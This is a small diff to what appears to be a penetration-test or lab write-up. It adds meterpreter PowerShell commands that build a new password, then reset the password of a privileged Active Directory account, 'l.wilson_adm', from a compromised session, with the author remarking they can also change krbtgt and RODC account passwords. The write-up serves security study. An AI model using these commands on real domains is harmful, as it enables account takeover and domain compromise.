@@ -309,6 +309,9 @@ AuditFlags             : None
 Looks like we can change the password for Liz Wilson Adm, RODC01$, and krbtgt_8245. Don't mind if I do.
 
 ```
+meterpreter > powershell_execute "$NewPassword = ConvertTo-SecureString 'NewPassword123!' -AsPlainText -Force"
+[+] Command execution completed:
+
 meterpreter > powershell_execute "Set-ADAccountPassword -Identity 'l.wilson_adm' -NewPassword $NewPassword"
 [+] Command execution completed:
 
